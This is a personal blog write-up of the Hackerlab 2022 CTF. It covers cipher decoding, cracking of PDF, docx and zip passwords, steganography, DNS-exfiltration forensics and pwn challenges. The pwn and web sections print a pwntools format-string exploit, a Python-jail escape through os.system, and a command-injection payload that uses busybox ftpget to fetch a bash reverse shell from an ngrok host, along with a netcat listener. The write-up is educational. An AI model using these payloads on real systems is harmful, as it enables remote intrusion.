---
title: "Hackerlab 2022"
date: 2022-09-16T18:33:31+01:00
draft: false
categories:
  - Hackerlab
---

{{< post-img src="hacklab.png" alt="hackerlab-2022" style="width:200px" >}}

Ok so I was part of the hackerlab, a CTF (the only one?) hosted by my country.
And this year they extended it to all the (16) countries of ECOWAS.
It was a great experience, even though I didnt make it to the finals.

I decided to make some writeups.

There were two types of challenges:
- Basics (like the name says...)
- Stages: The real thing! you unlocked those one by one

I wanted to make separate writeups but I got lazy, so I will do everything here, In this single file.

I won't therefore explain everything, or this will turn into a book. So here we go!

## Basics

### Discord

- points = 5
- status = solved

This was just basically for filtering people. They pinned a welcome message in the discord server with this:
`PGS_nE3L0HE34ql??????????`

I just went to the [kitchen](https://gchq.github.io/) and added some ROT13 sauce to get served with the flag.


### Youtube

- points = 5
- status = solved

Same value as "Discord" challenge.
In the details of their announcement video (on youtube) you can see some very obvious binary.

```
00100001 00100001 00100001 00110010 00110011 00110110 00110001 00110001 00110010
00110110 00110010 00110111 01101001 01110100 00110000 01000111 00110001
01011111 01000110 01010100 01000011
```
Just go to the [kitchen](https://gchq.github.io/) again, but this time be careful, there is two sauces to use.

### Jsfuck

- points = 10
- status = solved

This one was fun, because the name itself is a big hint, but the challenge was actually finding the javascript to deobfuscate.
Took me way to much more time than needed but remember to check all the files,
even `awesome-fonts.js` (sometimes people hide things in css files too so...yeah).

Use some google-fu to deobfuscate the jsfuck

Add some clarity in their nonsenses

```js
cipher = [67, 85, 68, 92, 55, 49, 51, 94, 90, 56, 109, 99, 59, 50, 63, 61, 35, 37]
var f = ""
function xor_xor(x, y) {
	return x ^ y;
}
for (var i = 0; i < cipher.length; i++) {
	f += " " + xor_xor(cipher[i] ^ i);
}
console.log(f);
```
Go to the [kitchen](https://gchq.github.io/)

Decimal ascii code salsa aaaaand f*ck 'em!!


### Secret pdf

- points = 20
- status = solved

You get an [encrypted pdf](secret.pdf)

john (the ripper)? hashcat? well whatever suits your needs!

I simply used `pdfcrack` lol

```bash
└──╼ $pdfcrack -f secret.pdf -w /usr/share/wordlists/rockyou.txt
PDF version 1.7
Security Handler: Standard
V: 2
R: 3
P: -1060
Length: 128
Encrypted Metadata: True
FileID: 15c0aee17f397540bdec4edb020a2247
U: 447e5ab472a0d9557b9f8664bb73c00900000000000000000000000000000000
O: cc34bdea75a5d9ac0346d4a2adcb39ac72d8aeb6dc275e4b187fb19d3cdd2cf1
Average Speed: 34373.2 w/s. Current Word: 'bluepoint'
Average Speed: 34360.6 w/s. Current Word: 'protea'
Average Speed: 34054.4 w/s. Current Word: 'alison1402'
Average Speed: 34566.6 w/s. Current Word: 'willie331'

...[REDACTED]

Average Speed: 32446.0 w/s. Current Word: 'aidenhornsby'
found user-password: 'MyP@ssw0rd!'
```
Then when you open the pdf select the WHOLE PAGE (ALL OF IT)

back to the [kitchen](https://gchq.github.io/) to decode the hidden text. Big hint: ASCII OCTAL CHARACTERS!

### Secret doc

- points = 30
- status = unsolved

That's where I started to be stupid. The thing is...I was on the right track most of the times.

I tried to bruteforce the [encrypted docx file](secret.docx)

```bash
└──╼ $python2 /usr/share/john/office2john.py secret.docx > secret.txt
└──╼ $cat secret.txt
secret.docx:$office$*2013*100000*256*16*744b3976099...[REDACTED MAD LONG HASH]

└──╼ $hashcat -a 0 -m 9600 secret.txt /usr/share/wordlists/rockyou.txt
...

Hashfile 'secret.txt' on line 1 (secret...8bcc10dca254a958b40b018d07ac5670): Signature unmatched
No hashes loaded.

```

Why didnt it work? format! hashcat doesnt recognize what john produced so remove the name

```bash
└──╼ $cat secret.txt
$office$*2013*100000*256*16*744b3976099d...[REDACTED MAD LONG HASH]
```
Started but took so damn long I started to think it wasn't about bruteforcing...

Seems like I was wrong...It was! I Just needed to try harder! (or get a better computer)

According to [those guys](https://github.com/TargetRoot/CTF)
`└──╼ $hashcat -a 0 -m 9600 hash.txt /usr/share/wordlists/rockyou.txt` was supposed to give me the password `H4cK3r`

And just like for the secret pdf challenge there were hidden characters so SELECT EVERYTHING!

You get this: `DSAXC7D.86543Eur04&&` (hint: XOR)

But what is the key?

[those guys](https://github.com/TargetRoot/CTF) used did a clever scripting move

knowing the flag format is "CTF_whatever" using python to compare the characters xor indeed gives you the key

```bash
python -c "for i,j in zip(list('CTF_'),list('DSAX')): print(ord(i)^ord(j))"
```
Then simply decode it
```bash
python3 -c "for i in 'DSAXC7D.86543Eur04&&': print(chr(ord(i)^7),end='')"
```
But if you are not a clever scripter (no judging) just go to the
[kitchen](https://gchq.github.io/) and Bruteforce that XOR. You get the flag anyway you want.


### Amazone

- points = 50
- status = unsolved

{{< post-img src="amazone.jpeg" alt="amazone" style="width:400px" >}}

Ok This one is steganography and my favorite one. But I didnt solve it!

Again I was so close...I was mislead by the "Let me talk!"

It was the classics...exif data empty, steghide show data but passphrase needed

`stegseek` was the next logical thing...but failed!

Another hint was `leet`...the passphrase was simply "amazone" in leetspeak

I mean...just `4m4z0n3` (I felt stupid a bit)

With that you extract the flag directly!


### Ecowas Portal

- points = 50
- status = unsolved

It's Reverse engineering...yes we all love those

Decompile the [binary file](ecowas_portal) with your favorite thing

I discovered [dogbolt](https://dogbolt.org/) doing this. It's a cool one as you get multiple decompilers at the same time

You get interesting variables and an encryption function (r2 or ghidra)

Once you understand how it works you can easily write a script to reverse the encrypt method and get the flag

>"It subtracts 0x14 (20) then makes an xor of the result with the index of the character variable"

### Zoro

- points = 50
- status = solved

I finally got my sh*t together and used some common sense.

Download that [totally not suspicious text file](hackerlab.txt)

```bash
└──╼ $file hackerlab.txt
hackerlab.txt: UTF-8 Unicode text, with very long lines, with no line terminators
```
I was confused a bit (`xxd` confirms) but A LOT of GOOGLE-FU solved this one

hint: `Zero-width characters` That's all you need

Also maybe [This](https://330k.github.io/misc_tools/unicode_steganography.html)


## Stages

### Exfiltration

- points = 300
- status = solved

ooh forensics...much detective...much suspense

You get a [Capture file](capture.pcap) so obviously you open wireshark and google "dns exfiltration"...then

```bash
└──╼ $tshark -r capture.pcap -T fields -e dns.qry.name -Y "dns.flags.response eq 0 && ip.dst==192.168.169.2" > output.txt
```
and clean the junk out

```bash
└──╼ $cat output.txt | sed 's/.hackerlab.africa//g' > clean_out.txt
```

Or in one take:
`tshark -r capture.pcap -T fields -e dns.qry.name -Y "dns.flags.response eq 0 && ip.dst==192.168.169.2" | sed 's/.hackerlab.africa//g' > output.txt`

Now go to the kitchen (cyberchef)

from hex and then png download...aaaand it's messed up

```bash
└──╼ $binwalk output.dat

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 757 x 459, 8-bit/color RGB, non-interlaced
24375         0x5F37          End of Zip archive, footer length: 22
```

??? wtf? there is two files?

The file I got was messed because there is actually two files to extract and we were fusing them!

we need to separate by request types (CNAME = 5 and A = 1 )

```bash
└──╼ $tshark -r capture.pcap -T fields -e dns.qry.name -Y "dns.flags.response eq 0 && ip.dst==192.168.169.2 && dns.qry.type==1" | sed 's/.hackerlab.africa//g' > output1.txt

└──╼ $tshark -r capture.pcap -T fields -e dns.qry.name -Y "dns.flags.response eq 0 && ip.dst==192.168.169.2 && dns.qry.type==5" | sed 's/.hackerlab.africa//g' > output2.txt
```

Now with two output files I go back to the kitchen and extract files from them separately

I got a clear png now that hints me to bruteforcing

and a zlib/zip file?

```bash
└──╼ $file flag.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w.w.v.u.t.s.r.q.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w
flag.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w.w.v.u.t.s.r.q.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w: Zip archive data, at least v2.0 to extract

└──╼ $unzip flag.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w.w.v.u.t.s.r.q.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w
Archive:  flag.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w.w.v.u.t.s.r.q.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w
inflating: flag.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w.w.v.u.t.s.r.q.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v
```
Lol..when you unzip it inflates to a file with one less letter in the name

this is gonna take years LMAO so let's automate this (script it is) until...

```bash
Archive:  flag.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w.w.v.u.t.s.r.q.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a
End-of-central-directory signature not found.  Either this file is not
a zipfile, or it constitutes one disk of a multi-part archive.  In the
latter case the central directory and zipfile comment will be found on
the last disk(s) of this archive.
```

Now there is one that is not a zip?

Delete all the needless junk and keep `flag.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w.w.v.u.t.s.r.q.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a`

```bash
└──╼ $file flag.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w.w.v.u.t.s.r.q.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a
flag.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w.w.v.u.t.s.r.q.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a: XZ compressed data
```
Obviously...(XD)

the xs archives have a zip extension so `unxz` fails! rename to .xz then unxz several times (chunks are removed from file size) (rinse and repeat or automate ) Until...

```bash
└──╼ $mv flag.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w.w.v.u.t.s.r.q.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a flag.xz && unxz flag.xz

unxz : flag.xz: Format de fichier inconnu

└──╼ $file flag.xz
flag.xz: bzip2 compressed data, block size = 900k
```

LMAO! They just like to make people suffer! change the extraction method and...

```bash
└──╼ $file flag
flag: gzip compressed data, last modified: Tue Jul 26 19:46:33 2022, from Unix, original size modulo 2^32 939
```
BACK TO GZIP??? CMOOOOOON...spam extract again (wtf??? lol)

```bash
└──╼ $mv flag flag.gz && gunzip flag.gz

gzip: flag.gz: encrypted file -- use unzip
```
FINALLY! Back to reality! unzip it and realise its now the PNG's hint serves

```bash
└──╼ $unzip flag.zip
Archive:  flag.zip
[flag.zip] flag.txt password:

```
Crack this sht

```bash
└──╼ $zip2john flag.zip > zip_hash.txt
ver 2.0 efh 5455 efh 7875 flag.zip/flag.txt PKZIP Encr: 2b chk, TS_chk, cmplen=330, decmplen=3403, crc=F6E944AC


└──╼ $john zip_hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 7 candidates buffered for the current salt, minimum 8 needed for performance.
...
0g 0:00:03:44  3/3 0g/s 9571Kp/s 9571Kc/s 9571KC/s kyolchou..kyolbagg
3c0w45           (flag.zip/flag.txt)
1g 0:00:04:42 DONE 3/3 (2022-08-28 18:21) 0.003535g/s 9810Kp/s 9810Kc/s 9810KC/s 3c0gbi..3c0igd
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```

Now the flag is a [QR code](flag.txt)

scan it with anything you want (zbartools dont work with txt files so you can flameshot it first or whatever) anyway...ggwp

### Breakme

- points = 300
- status = unsolved

I think I could do this one but I ran out of time...

Anyway...get the archive, explore the files and notice the [main.py module](main.py)

It's RE so understand what it does and...well...reverse it

[those guys](https://github.com/TargetRoot/CTF) wrote a nice [solution](solve_breakme.py) that gives you a base32 encoded string (just like the hint said)

It's a pastebin link leading to a 3D obj file (made in blender)

Find any [3D viewer](https://3dviewer.net/) to open it and get some morse in 3D (incredible)

Back to the [kitchen](https://gchq.github.io/) to get that flag


### Invisible

- points = 300
- status = unsolved

Get the [Binary](invisible)...It's pwn so you know what to do already

It's all about `ELF x64 - Format string bug`

I might update this later with more details but as I didnt solve it I will simply refer to [those guys](https://github.com/TargetRoot/CTF)'s solution using `pwntools` on remote

```python
from pwn import *
from time import sleep
context.arch = 'amd64'
for i in range(500):
	conn=remote('51.38.37.81',1234)
	payload=fmtstr_payload(8,{0x000000000040405c:200})
	conn.sendline(payload)
	print(conn.recvall())
	conn.close()
	sleep(0.1)
```

### Queen

- points = 550
- status = unsolved

This one had the most points?? wow

First google `python jail`

Connect to the server

```bash
└──╼ $nc 51.38.37.81 7002
Please, save me from this hell :'(
>>>
```
Checking if `sys` is present

```bash
>>> print sys
<module 'sys' (built-in)>

>>> print dir(sys)
['__displayhook__', '__doc__', '__excepthook__', '__name__', '__package__', '__stderr__', '__stdin__', '__stdout__', '_clear_type_cache', '_current_frames', '_getframe', '_git', 'api_version', 'argv', 'builtin_module_names', 'byteorder', 'call_tracing', 'callstats', 'copyright', 'displayhook', 'dont_write_bytecode', 'exc_clear', 'exc_info', 'exc_type', 'excepthook', 'exec_prefix', 'executable', 'exit', 'flags', 'float_info', 'float_repr_style', 'getcheckinterval', 'getdefaultencoding', 'getdlopenflags', 'getfilesystemencoding', 'getprofile', 'getrecursionlimit', 'getrefcount', 'getsizeof', 'gettrace', 'hexversion', 'long_info', 'maxint', 'maxsize', 'maxunicode', 'meta_path', 'modules', 'path', 'path_hooks', 'path_importer_cache', 'platform', 'prefix', 'py3kwarning', 'setcheckinterval', 'setdlopenflags', 'setprofile', 'setrecursionlimit', 'settrace', 'stderr', 'stdin', 'stdout', 'subversion', 'version', 'version_info', 'warnoptions']

>>> print sys.modules
{'copy_reg': <module 'copy_reg' from '/usr/local/lib/python2.7/copy_reg.py'>, 'sre_compile': <module 'sre_compile' from '/usr/local/lib/python2.7/sre_compile.py'>, '_sre': <module '_sre' (built-in)>, 'encodings': <module 'encodings' from '/usr/local/lib/python2.7/encodings/__init__.py'>, 'site': <module 'site' from '/usr/local/lib/python2.7/site.py'>, '__builtin__': <module '?' (built-in)>, 'sysconfig': <module 'sysconfig' from '/usr/local/lib/python2.7/sysconfig.py'>, '__main__': <module '__main__' from 'chal.py'>, 'encodings.encodings': None, 'abc': <module 'abc' from '/usr/local/lib/python2.7/abc.py'>, 'posixpath': <module 'posixpath' from '/usr/local/lib/python2.7/posixpath.py'>, '_weakrefset': <module '_weakrefset' from '/usr/local/lib/python2.7/_weakrefset.py'>, 'errno': <module 'errno' (built-in)>, 'encodings.codecs': None, 'sre_constants': <module 'sre_constants' from '/usr/local/lib/python2.7/sre_constants.py'>, 're': <module 're' from '/usr/local/lib/python2.7/re.py'>, '_abcoll': <module '_abcoll' from '/usr/local/lib/python2.7/_abcoll.py'>, 'types': <module 'types' from '/usr/local/lib/python2.7/types.py'>, '_codecs': <module '_codecs' (built-in)>, 'encodings.__builtin__': None, '_warnings': <module '_warnings' (built-in)>, 'genericpath': <module 'genericpath' from '/usr/local/lib/python2.7/genericpath.py'>, 'stat': <module 'stat' from '/usr/local/lib/python2.7/stat.py'>, 'zipimport': <module 'zipimport' (built-in)>, '_sysconfigdata': <module '_sysconfigdata' from '/usr/local/lib/python2.7/_sysconfigdata.py'>, 'warnings': <module 'warnings' from '/usr/local/lib/python2.7/warnings.py'>, 'UserDict': <module 'UserDict' from '/usr/local/lib/python2.7/UserDict.py'>, 'encodings.utf_8': <module 'encodings.utf_8' from '/usr/local/lib/python2.7/encodings/utf_8.py'>, 'sys': <module 'sys' (built-in)>, 'codecs': <module 'codecs' from '/usr/local/lib/python2.7/codecs.py'>, 'os.path': <module 'posixpath' from '/usr/local/lib/python2.7/posixpath.py'>, '_locale': <module '_locale' from '/usr/local/lib/python2.7/lib-dynload/_locale.so'>, 'signal': <module 'signal' (built-in)>, 'traceback': <module 'traceback' from '/usr/local/lib/python2.7/traceback.py'>, 'linecache': <module 'linecache' from '/usr/local/lib/python2.7/linecache.py'>, 'posix': <module 'posix' (built-in)>, 'encodings.aliases': <module 'encodings.aliases' from '/usr/local/lib/python2.7/encodings/aliases.py'>, 'exceptions': <module 'exceptions' (built-in)>, 'sre_parse': <module 'sre_parse' from '/usr/local/lib/python2.7/sre_parse.py'>, 'os': <module 'os' from '/usr/local/lib/python2.7/os.py'>, '_weakref': <module '_weakref' (built-in)>}

```
Os module allow code execution...so yeah

```bash
>>> print sys.modules['os'].system('ls -al')
total 28
drwxr-x--- 1 root ecowas 4096 Aug  3 20:40 .
drwxr-xr-x 1 root root   4096 Aug  3 22:51 ..
-rwxr-x--- 1 root ecowas 8916 Aug  3 20:39 chal.py
-rwxr----- 1 root ecowas   21 Aug  3 19:48 flag.txt
-rwxr-x--- 1 root ecowas   53 Aug  3 20:02 start.sh
0
```
Lol this one is amazing

```bash
>>> print sys.modules['os'].system('cat flag.txt')
Check the source code0
```
I knew It could not be over yet

```bash
>>> print sys.modules['os'].system('cat chal.py')
...
[REDACTED]
```
I put the mad long output [here](chal.py)

Big hints: `RSA cracking + hex string`

Trust me..;alot of scripting is involved from here

But to not be too verbose I once again refer to [those awesome guys](https://github.com/TargetRoot/CTF) and their final payload

```python
from pwn import *
def f (param1):
	local_10=1
	local_14=2
	while local_14<=param1:
		local_10 = local_14 * local_10
		local_14 = local_14 + 1
	return local_10
def D(param1,param2):
	return f(param1)//(f(param2)*f(param1-param2))
def checking (param1):
	d=[]
	for i in range(param1+1):
		d.append(D(param1,i))
	return d
conn=remote('51.38.37.81',4003)
a=int(conn.recvline().decode())
print(a)
d=checking(a)
print(len(d))
for i in range(a+1):
	print(d[i])
	conn.sendline(str(d[i]).encode())
print(conn.recvall())

```


### Final

- points = 250
- status = unsolved

The last one! It's a [web challenge!](http://51.38.37.81:4043/)

I didnt do it so still according to [my G's](https://github.com/TargetRoot/CTF)

It was straightforward RCE but...for RCE you might need a VPS (idk If ngrok)

```bash
└──╼ $pip3 install pyftpdlib

└──╼ $echo 'bash -i >& /dev/tcp/tcp://6.tcp.ngrok.io:16211/4444 0>&1' > shell

└──╼ $sudo python -m pyftpdlib -p 21
[I 2022-09-04 15:15:50] concurrency model: async
[I 2022-09-04 15:15:50] masquerade (NAT) address: None
[I 2022-09-04 15:15:50] passive ports: None
[I 2022-09-04 15:15:50] >>> starting FTP server on 0.0.0.0:21, pid=8573 <<<

└──╼ $?user_inputs[0]=e&user_inputs[1]=a%0a&user_inputs[2]=busybox&user_inputs[3]=ftpget&user_inputs[4]=51383781&user_inputs[5]=1337
[4] 8906
[5] 8907
[6] 8908
bash: ?user_inputs[0]=e : commande introuvable
[7] 8909
[8] 8910
[3]   Fini                    user_inputs[1]=a%0a
[4]   Termine 127             ?user_inputs[0]=e
[7]-  Fini                    user_inputs[3]=ftpget
[8]+  Fini                    user_inputs[4]=51383781

└──╼ $?user_inputs[0]=e&user_inputs[1]=a%0a&user_inputs[2]=bash&user_inputs[3]=1337
[7] 8912
bash: ?user_inputs[0]=e : commande introuvable
[8] 8913
[9] 8914
[5]   Fini                    user_inputs[1]=a%0a
[6]   Fini                    user_inputs[2]=busybox
[7]   Termine 127             ?user_inputs[0]=e
[8]-  Fini                    user_inputs[1]=a%0a
[9]+  Fini                    user_inputs[2]=bash
```
In the payload `...[4]=51383781...` Is the target IP without the dots (avoid preg_match)


Before running the last command I had my listener up

```bash
└──╼ $nc -lnvp 4444
listening on [any] 4444 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 35042
SSH-2.0-ssh2js1.4.0
```
I got a connection but It didnt live. I might update this later but seems it's the last step

You just get the flag after this one


## END OF THE LINE!

{{< post-img src="scores.png" alt="my-score" style="width:500px" >}}

That was an awesome experience, even though I joined late, I had alot of fun and most importantly learnt alot!

I could see there are alot of talented hackers out there, even just in my country

[Those Guys](https://github.com/TargetRoot/CTF/tree/main/Hackerlab2k22) were awesome. They almost made it to finals while I was 75th on a total of 220 participating teams (not good not terrible)

So I know there is still alot for me to learn, and that's what I am gonna do

keep learning folks!
